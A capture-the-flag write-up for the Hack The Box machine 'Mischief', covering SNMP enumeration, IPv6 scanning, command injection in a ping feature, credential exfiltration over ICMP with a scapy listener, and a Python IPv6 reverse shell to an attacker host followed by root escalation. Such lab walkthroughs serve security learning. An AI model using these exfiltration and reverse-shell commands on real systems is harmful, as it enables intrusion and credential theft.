---
title: "HTB - Mischief"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "SNMP", "IPv6", "Linux", "Privilege Escalation"]
summary: ""
---

## 🔍 Port Scanning

```bash
sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.10.92 -oG allPorts
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
3366/tcp open  creativepartnr
```

```bash
sudo nmap -sCV -p 22,3366 10.10.10.92 -oN targeted
```

Port 3366 hosts a **Radicale** calendar and contact server requiring authentication.  
When submitting invalid credentials, it echoes back the input encoded in Base64:

```bash
echo "YWRtaW46YWRtaW4xMjM=" | base64 -d
# admin:admin123
```

This indicates Base64 encoding of credentials, possibly by a backend script.

## 📡 UDP Enumeration

```bash
sudo nmap -sU --top-ports 500 -v -n 10.10.10.92
```

```bash
161/udp open  snmp
```

Brute-forcing SNMP community string using `onesixtyone`:

```bash
onesixtyone 10.10.10.92 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

Once found, we extract the IPv6 address:

```bash
snmpwalk -v2c -c public 10.10.10.92 ipAddressType
# de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:f6:a0
```

Simplified:
```
dead:beef::250:56ff:feb9:f6a0
```

## 🌍 IPv6 Port Scanning

```bash
sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn -6 dead:beef::250:56ff:feb9:f6a0 -oG allPortsIpV6
```

Ports 22 and 80 are open.

The site on port 80 shows a login portal.  
Using `snmpwalk`, we enumerate processes:

```bash
snmpwalk -v2c -c public 10.10.10.92 hrSWRunName | grep python
```

Revealed a command:

```
-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
```

## 🔐 Credentials Found

From SNMP data, we find:

- `loki:godofmischiefisloki`
- `loki:trickeryanddeceit`

On the IPv6 site, logging in as `administrator` with `trickeryanddeceit` works.

This interface has a **ping** feature. Using:

```bash
ping -c 2 10.10.14.3
```

...and monitoring with:

```bash
tcpdump -i tun0 icmp -n
```

Confirmed command execution.

## 📦 Data Exfiltration via ICMP

Run this in the web interface:

```bash
xxd -p -c 4 /home/loki/cred* | while read line; do ping -c 1 -p $line 127.0.0.1; done
```

Python listener script:

```python
from scapy.all import *
def data_parser(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
        data = packet[ICMP].load[-4:].decode("utf-8")
        print(data, flush=True, end='')

sniff(iface='tun0', prn=data_parser)
```

Recovered password: `lokiisthebestnorsegod`

## 🐚 SSH Access & Escalation

Login as `loki`:

```bash
ssh loki@10.10.10.92
```

In `.bash_history`, we find:

```
su root
password: lokipasswordmischieftrickery
```

But `su` fails due to restricted ACLs:

```bash
getfacl /bin/su
```

Only readable by `loki`.

## 🔁 Bypassing ACL via Reverse Shell

Send a reverse shell from the web interface using IPv6:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1001",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

Listener:

```bash
sudo ncat -nv --listen dead:beef:2::1001 443
```

Upgrade shell:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

Now `su root` works with the password from `.bash_history`.

## 🏁 Final Flag

The root flag was hidden in an unexpected location:

```bash
find / -name root.txt
# ./usr/lib/gcc/x86_64-linux-gnu/7/root.txt
```

🎯 **Root access achieved.**
